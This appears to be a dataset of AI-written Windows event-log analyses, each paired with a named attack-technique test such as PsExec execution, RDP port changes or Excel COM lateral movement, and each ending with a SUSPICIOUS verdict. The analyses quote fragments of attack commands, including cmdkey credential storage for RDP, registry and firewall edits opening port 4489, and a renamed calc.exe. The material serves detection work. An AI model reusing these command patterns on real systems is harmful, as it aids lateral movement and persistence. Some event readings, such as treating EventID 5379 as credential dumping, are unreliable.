### Conclusion

**Resolution: SUSPICIOUS**

Further investigation is warranted, specifically regarding:
- Verification if the PowerShell command was authorized.
- Validation of necessity and intent behind the administrative privileges and user accounts' activities.
- Confirmation of any external logins or anomaly in access patterns by the `admin_test` account.
- Investigation into why multiple time adjustments occurred.

**Guidance on how to proceed:**
- Check with system administrators regarding any scheduled tasks or recent configurations that match these PowerShell and tool activities.
- Review and validate system and user account policies, specifically around user `admin_test`.
- Monitor network traffic for any unusual patterns or unexplained connections.

Exfiltration Over SMB over QUIC (New-SmbMapping),"**Detailed Analysis of the Windows Event Logs**

1. **Overview of Events**:
   - The logs captured are from several Windows event channels including Sysmon, Security, PowerShell, Application, and System.
   - They detail various activities such as the execution of system utilities, PowerShell commands, time adjustments, and software updates.

2. **Sysmon Events Analysis**:
   - **Frequent Execution of System Utilities**: The logs show multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. These utilities, particularly `wevtutil.exe`, are used for managing event logs which can include clearing them. The frequent use raises a cautionary flag as it might indicate log tampering or clearing attempts.
   - **Execution of PowerShell with Networking Commands**: A PowerShell command was executed which involved mapping a remote path with the `-SkipCertificateCheck` option. This could suggest an attempt to access a network share without verifying its legitimacy.
   - **Use of High Integrity Level**: The PowerShell session and other processes are executed with high integrity, indicating administrative privileges. While this might be normal for an admin account, combined with the other activities, it adds a layer of risk.
   
3. **Security and System Logs Analysis**:
   - **Change in System Time**: There are entries showing the system time was changed, possibly indicating time manipulation. This could be an attempt to evade timestamp logging in other activities, often correlated with malicious intent.
   - **User Permissions**: Most activities are executed under the `SERVER002\admin_test` user or `NT AUTHORITY\SYSTEM`, suggesting authorized access but should still be scrutinized given the nature of other event activities.

4. **PowerShell Logs Analysis**:
   - The PowerShell script executed involved creating an SMB mapping without certificate checks, and attempting to copy a file. This is an unusual action that could either be a benign admin task or attempts at unauthorized data access or exfiltration.
   - The failure to find the drive 'Z:\\' suggests the operation was not completely successful, indicating a possible misconfiguration or attempted unauthorized access to a network resource.

5. **Application and Edge Update Events**:
   - Regular executions of `MicrosoftEdgeUpdate.exe` and related logging do not show immediate signs of inconsistency, as these are routine update checks and installations.
   
6. **Final Assessment**:
   - **Suspicious Behavior**: There are multiple signs of suspicious behavior, including unusual frequency of event log utility executions, use of PowerShell with commands that bypass security checks, and system time adjustments which could suggest logging evasion.

**Resolution**: **SUSPICIOUS**

**Guidance on Proceeding**:
- **Further Investigation**: Conduct a more in-depth investigation into the user `SERVER002\admin_test` to verify the legitimacy of their activities.
- **Verify Permissions and Intent**: Check with the system administrator or user to confirm if these tasks were intentional maintenance operations.
- **Enhanced Monitoring**: Set up monitoring or alerts for future occurrences of these types of activities, especially around PowerShell executions and system time changes.
- **Security Audit**: Consider an audit of the system’s security policies and the user's access levels to ensure they align with best practices and security protocols."
Copy and Execute File with PsExec,"**Detailed Log Analysis:**

Based on the provided event logs, several entries suggest potentially suspicious behavior:

1. **PSEXESVC Service Installation:**
   - **System Log EventID 7045:** Installation of a service named `PSEXESVC` which is associated with PsExec, a tool often used legitimately for remote administration but also abused by attackers for lateral movement and unauthorized execution. The installation of this service indicates the use of PsExec on `Server002`.

2. **PowerShell and Command Execution:**
   - **Sysmon Log EventID 1 and 5:** Multiple PowerShell and Command Prompt executions were recorded. Specifically, PowerShell was executed by the user `admin_test` (EventRecordID 17938) and subsequent command-line activity using utilities such as `whoami.exe` and `cmd.exe`. 
   - **CMD Execution:** There is a suspicious Cmd.exe command executed (EventID 17969) which involves `PsExec.exe`. This further supports the use of PsExec for executing commands which can be associated with malicious activities if done without a proper administrative purpose.

3. **Use of PsExec:**
   - **Sysmon Log EventID 1:** PsExec process executions (`PsExec.exe` and `PSEXESVC.exe`) show that `PsExec` is being used (EventIDs 17971 and 17972). This indicates activity associated with potentially unauthorized remote command execution tools.

4. **Privilege Escalation & High Integrity Level:**
   - **Security Log EventID 4672:** Shows the assignment of special privileges to user accounts like `admin_test`, which includes privileges such as `SeDebugPrivilege` and `SeBackupPrivilege`. Acquiring these privileges may indicate privilege escalation which is a known tactic for lateral movement or executing higher integrity level operations.

5. **Network Logon and NTLM Authentication:**
   - **Security Log EventID 4624:** Network logon types and authentication logging with NTLM suggest possible connection from a different workstation (`DESKTOP-3HL5B2P`). Remote logons using administrative accounts like `admin_test` are worth investigating further to ensure they are legitimate.

**Assessment and Decision:**

Based on the indicators mentioned, there appears to be a pattern of potentially malicious behavior associated with:
- The execution of PsExec which is often linked with unauthorized access or lateral movement within a network.
- The presence of high-integrity processes executed by potentially escalated accounts.
- Unusual network logon activities, though not definitively malicious, warrant further scrutiny, especially considering their context linked with potentially compromised accounts.

The culmination of these findings focuses on:
- The use of typical hacking tools such as PsExec.
- Actions that might suggest unauthorized remote executions.
- The unusual behavior of the `admin_test` account with special privileges.

**Recommendation:**

- **Resolution:** SUSPICIOUS
  
  This activity should be labeled as ""SUSPICIOUS"" and it needs further investigation. Steps should involve:
  - Immediately reviewing the purpose and legitimacy of the PsExec usage.
  - Conducting a thorough audit and validation of the `admin_test` account to ensure no unauthorized usage.
  - Monitoring network traffic and remote authentication logs for irregular patterns.
  - Cross-verifying any remote connections originating from `DESKTOP-3HL5B2P` and similar incidents for potential unauthorized access.

Proceed with caution and involve incident response activities to ascertain if this poses a risk to broader network integrity."
Changing RDP Port to Non Standard Port via Powershell,"### Analysis Summary

Upon a detailed review of the provided logs from the Security, System, Sysmon, Application, and Windows PowerShell channels, I've identified several activities of interest:

#### Security Log
- **EventID 5379**: Multiple security events report an error (ReturnCode: 3221226021), showing repeated attempts to utilize services or authenticate with ""MicrosoftAccount:user=02txoixylodcstop"" and similar entries. The error code indicates a failure, but it generally pertains to failed credential validation using a target name related to Microsoft accounts. While repeated attempts could suggest an issue, the lack of credential-related details (e.g., passwords, successful logins) makes it difficult to classify this definitively as an attack without further context.

#### System Log
- **Windows Update Events**: Standard update events for Microsoft Defender Antivirus indicate routine system maintenance and updates, which is expected and non-suspicious.

#### Sysmon Log
- **Process Creation**:
  - **PowerShell Command**: A suspicious PowerShell command was executed to modify the RDP port (`Set-ItemProperty` to port 4489) and allow inbound connections through the firewall (`New-NetFirewallRule`). This type of activity is commonly associated with lateral movement attempts or backdoor access.
  - **Process and Image Paths**: Several processes like `wevtutil.exe`, `whoami.exe`, and `conhost.exe` are seen running, which can be regular or administrative utilities but can also be utilized for malicious purposes if their execution is unsolicited or suspiciously timed.
  
- **Edge Update Process**: Microsoft Edge is seen updating, which is normal behavior for browser maintenance.

#### Application and PowerShell Logs
- **PowerShell Engine Start/End**: It confirms the suspicious PowerShell script discussed earlier was executed which aligns with potentially unauthorized configuration changes.
  
### Assessment

Based on the identified activities, the evidence suggests notably suspicious behavior:

- The unauthorized modification of the RDP port through PowerShell is highly indicative of an attempt to enable remote access, potentially facilitating unauthorized access or persistence.
- Routine update processes and other benign system updates do not present immediate concerns.

### Resolution

**Resolution: SUSPICIOUS**

The attempted modification of RDP settings and firewall rules using PowerShell, combined with repeated failed access attempts using potential Microsoft credential-related events, suggest suspicious behavior. This warrants a deeper investigation to confirm the intent and origin of these actions to determine if an intrusion or unauthorized change has taken place.

Changing RDP Port to Non Standard Port via Command_Prompt,"Based on the analysis of the provided logs, here's a detailed breakdown of suspicious or anomalous activities identified:

**1. Time Change Events:**
   - Several EventID 4616 and 1 logs indicate time change operations. System time manipulation can be an indicator of an attacker trying to obfuscate activities. However, the time difference is minimal (milliseconds), suggesting it might be a result of system processes rather than malicious intent.

**2. Privileged Logon and Privilege Assignment (EventID 4624 and 4672):**
   - The user `admin_test` logged on and immediately received high-level privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.). This behavior is typical for administrative accounts, but if `admin_test` is not recognized as a legitimate administrator, this logon is suspicious.

**3. Unauthorized Firewall and RDP Configuration:**
   - Sysmon EventID 1 shows that `cmd.exe` executed a command to change the RDP port and adjust firewall settings. This action (`cmd.exe /c reg add ...`) aligns with an attacker securing remote access by altering settings. Such changes without proper change management documentation can be malicious.

**4. Execution of Specific Tools:**
   - Several tools like `wevtutil.exe` and `whoami.exe` were executed by `admin_test`. While these are standard administrative tools, their execution alongside the port and firewall modifications raises concerns about potential system enumeration or log clearance efforts by an attacker.

**5. Microsoft Edge Installer Events:**
   - Multiple Edge installer events with consistent system-user execution suggest regular, automated updates. Without further context, these appear benign, reflecting typical application maintenance.

**6. Registry and Network Tool Usage:**
   - Registry modification and network shell usage (via `reg.exe` and `netsh.exe`) imply potential attempts to disable security features or alter configurations for persistent access or exfiltration. These processes were triggered during a suspicious command line operation.

Overall **assessment**:
- The log activities related to time change, privileged logon, and RDP/firewall configuration are notably suspicious. Specific administrative activities suggest the potential for persistent access or preparatory steps for further compromises. 

**Resolution**: SUSPICIOUS

**Guidance on How to Proceed**:
- Verify `admin_test` as a legitimate user and scrutinize their access activities.
- Review the legitimacy and context of firewall and RDP port reconfigurations.
- Conduct a full security assessment, including a review of recent access permissions and any logs for unauthorized changes or access attempts.
- Engage in threat hunting to identify any command and control communications or data exfiltration attempts.
- Remind users and administrators of security protocols and the importance of adhering to security practices."
RDP to DomainController,"Upon reviewing the provided event logs, the following insights regarding potential indicators of suspicious or malicious activity were identified:

### Suspicious Indicators and Activity Analysis:

1. **Credential Dumping Attempts:**
   - Multiple occurrences of Event ID 5379 in the security logs suggest attempts to read credentials, all of which resulted in failure with ReturnCode `3221226021`. This indicates an attempt at reading credential information that is failing, potentially suggesting reconnaissance or enumeration activities.
   
2. **PowerShell Usage with Sensitive Data:**
   - There is evidence in the Sysmon logs (Event ID 1) of PowerShell being used with what appears to be a scripted command to handle sensitive information (`cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password, mstsc...`). This is undesirable behavior as it involves handling plaintext passwords in scripts. PowerShell is often used for legitimate automation and scripting, but it is also commonly used in attacks for obfuscation or execution of malicious commands.
   
3. **Privilege Escalation and Sensitive Privileges:**
   - Event ID 4672 indicates the assignment of a wide range of high-privilege tokens including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. While these privileges are sometimes necessary, their presence could also indicate attempts at privilege escalation if assigned inappropriately.
   
4. **Process Creation and Command Line Arguments:**
   - Observations of processes such as `cmdkey.exe`, `mstsc.exe` (Remote Desktop Connection), and other processes manipulated via PowerShell without typical user interaction suggests an automated or scripted operation. The command lines provided with these processes included sensitive data and connections to potentially establish RDP sessions, which could be indicative of a lateral movement or persistence attempt.

5. **Use of Common Administrative Tools:**
   - Sysmon logs show instances of `whoami.exe` and `hostname.exe`, which are typical administrative tools but are also known to be used in the context of an attacker trying to glean information about the current system environment.

### Assessment & Conclusion:

Upon thorough analysis, there are several indicators that suggest the potential for malicious activity:

- The combination of repeated failed attempts to enumerate credentials, the scripting of PowerShell including sensitive data (possibly for remote sessions), and the execution of various executable with sensitive privileges collectively raise concern.

Given these factors, the situation cannot be immediately concluded as malicious without further investigation. However, the pattern of events and usage observed require cautious and detailed exploration.

### Resolution:

**SUSPICIOUS** - The logs contain activity that suggests the potential for malicious behavior and thus require more in-depth analysis. This involves investigating the source and intent of the PowerShell script, ensuring all user activities around these processes are verified for legitimacy, and evaluating the reasons behind failed credential read attempts.

### Recommendations for Further Action:

- **Conduct a Thorough Investigation**: Trace back the source, origin, and execution context of the PowerShell script, especially looking for who executed it and for what purpose.
- **Inspect User Credentials**: Verify the legitimacy of user actions around the suspicious event times. Assess if there are unauthorized access attempts or unusual patterns.
- **Review System Hardening Measures**: Ensure administrative privileges are correctly assigned and limit any unnecessary high-privilege tokens.
- **Enhance Monitoring**: Increase monitoring for further occurrences of abnormal behavior in processes, especially those tied to PowerShell and credential management.
- **Conduct a Network Review**: Look for signs of lateral movement or persistence, such as unexpected RDP connections or unauthorized administrative activities.

Take preventative measures if any vulnerabilities are discovered during your investigation to prevent future occurrences."
PowerShell Lateral Movement Using Excel Application Object,"Upon reviewing the provided event logs, here's a detailed analysis based on the event entries:

### System Log Analysis
- The system logs indicate normal operation for the Windows Update Client with updates for Microsoft Defender Antivirus being processed. There are no unusual or suspicious events logged in this section. The updates are legitimate actions aimed at updating the antivirus definitions.

### Windows PowerShell Log Analysis
- A PowerShell command attempted to copy `calc.exe` to a different location under a new name `foxprow.exe`. This activity is often associated with attempts to circumvent security mechanisms or create executables manipulated by malicious intent.
- This PowerShell command also includes attempts to manipulate COM objects with an Excel Application, which is suspicious since invoking `Excel.Application` is typically not part of standard administrative tasks and could be used to execute macros or scripts indirectly.

### Sysmon Log Analysis
- Sysmon records show the execution of PowerShell and associated console hosts. Notably, the execution command for PowerShell matches the suspicious behavior highlighted in the Windows PowerShell log. 
- The execution of processes such as `hostname.exe`, `whoami.exe`, and `MicrosoftEdgeUpdate.exe` appear standard and related to identification and update processes for Windows and Microsoft Edge, respectively.
- The PowerShell execution with suspicious command lines corresponds to `SERVER002\admin_test`, which aligns with potential misuse of an administrative account.

### Assessment of the Situation
The logs exhibit a specific attempt to execute PowerShell commands that are potentially malicious in nature, aiming to:
- Use a common executable (`calc.exe`) in a suspicious rename operation.
- Interact with the Excel application, which can be a vector for delivering payloads in scripts.

### Resolution
**Resolution: SUSPICIOUS**

Given the nature of the PowerShell commands, particularly the attempt to manipulate executable files and use COM object interaction related to Excel, these actions are deemed suspicious and warrant further investigation.

### Guidance on How to Proceed
1. **Investigate User Activity:** Review activities associated with the `SERVER002\admin_test` account for additional context. Confirm if these actions align with legitimate administrative tasks or if the account may have been compromised.
2. **Isolate the Host:** As a precaution, consider isolating `Server002` for further analysis to prevent potential lateral movement within the network.
3. **Conduct File Integrity Checks:** Analyze the integrity of `calc.exe` and other system files using a known baseline or verify their hashes against trusted repositories.
4. **Review Historical Logs:** Check historical logs for similar behavior or any anomalies in PowerShell logs or other executed commands that may suggest prior unauthorized actions.
5. **Network Monitoring:** Implement enhanced monitoring and alerting for suspicious command-line executions and behavioral anomalies across connected systems.

Conduct a thorough forensic analysis on `Server002` to further elucidate the intention and full scope of the suspicious activity observed."
